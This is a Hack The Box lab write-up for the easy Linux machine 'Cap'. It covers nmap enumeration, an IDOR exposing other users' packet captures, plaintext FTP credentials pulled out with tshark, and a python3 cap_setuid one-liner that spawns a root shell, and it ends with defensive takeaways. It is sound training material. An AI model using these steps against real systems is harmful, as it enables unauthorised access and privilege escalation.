# Cap - Hack The Box

**Difficulty:** Easy
**OS:** Linux
**IP:** 10.129.19.106

## Summary

Cap is an easy Linux machine running a Python-based "Security Dashboard" web application. The application contains an IDOR (Insecure Direct Object Reference) vulnerability that allows access to other users' network packet captures. One such capture contains plaintext FTP credentials, which grant user-level access. Privilege escalation is achieved through a Linux capability (`cap_setuid`) set on the Python 3.8 binary, allowing a trivial UID change to root.

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV 10.129.19.106
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

Three services exposed: FTP, SSH, and an HTTP web application. Anonymous FTP login was not permitted.

### Web Application

The web app at port 80 is a "Security Dashboard" built with Python/Gunicorn. It is logged in as user **Nathan** and has the following pages:

| Path | Description |
|------|-------------|
| `/` | Dashboard with security event stats |
| `/capture` | Triggers a 5-second PCAP network capture |
| `/ip` | Displays `ifconfig` output |
| `/netstat` | Displays `netstat` output |

Clicking "Security Snapshot" at `/capture` triggers a packet capture and redirects to `/data/[id]` where the results can be viewed and downloaded via `/download/[id]`.

## Exploitation

### IDOR - Insecure Direct Object Reference

The `/data/[id]` endpoint does not enforce authorization. While new captures are assigned incrementing IDs (e.g. `/data/1`), previous captures are accessible by simply changing the ID in the URL.

Navigating to `/data/0` reveals a capture with significantly more packets than the others — this was a capture made by the system or another user.

```bash
curl -s http://10.129.19.106/download/0 -o 0.pcap
```

### Credential Extraction from PCAP

Analyzing the PCAP with `tshark` reveals plaintext FTP credentials:

```bash
tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

```
USER    nathan
PASS    Buck3tH4TF0RM3!
```

FTP transmits credentials in cleartext, making them trivially extractable from network captures.

### User Access

The recovered credentials work over both FTP and SSH:

```bash
ssh nathan@10.129.19.106
# Password: Buck3tH4TF0RM3!
```

```bash
cat ~/user.txt
```

## Privilege Escalation

### Linux Capabilities - cap_setuid on Python3

Enumerating Linux capabilities reveals an overly permissive setting:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `cap_setuid` capability allows the Python binary to arbitrarily change its process UID. This means any user can escalate to root by calling `os.setuid(0)`:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This drops into a root shell.

```bash
cat /root/root.txt
```

## Key Takeaways

1. **IDOR vulnerabilities** arise when object references (like numeric IDs) are exposed without proper access control. Always enforce server-side authorization checks.
2. **FTP is insecure by design** — credentials and data are transmitted in plaintext. Use SFTP or FTPS instead.
3. **Linux capabilities** can be as dangerous as SUID bits. `cap_setuid` on an interpreter like Python is equivalent to giving all users root access. Audit capabilities regularly with `getcap -r /`.
